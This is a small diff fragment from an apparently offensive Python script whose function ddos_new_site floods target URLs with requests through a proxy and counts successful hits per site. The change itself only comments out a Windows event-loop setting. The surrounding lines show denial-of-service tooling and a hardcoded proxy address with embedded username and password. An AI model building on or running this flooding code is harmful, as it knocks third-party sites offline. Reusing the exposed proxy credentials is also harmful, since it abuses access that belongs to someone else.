@@ -51,7 +51,7 @@ def ddos_new_site(url, proxy):
         print(f'Valid requests: {resp.count(True)}/{len(resp)} for site: {url} during {time.time() - start_time} seconds')
         
 if __name__ == '__main__':
-    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+    # asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
     urls = take_urls()
     proxy = 'http://oHXOMY:uIJ0LLa6Ai@212.115.49.92:5500'
 
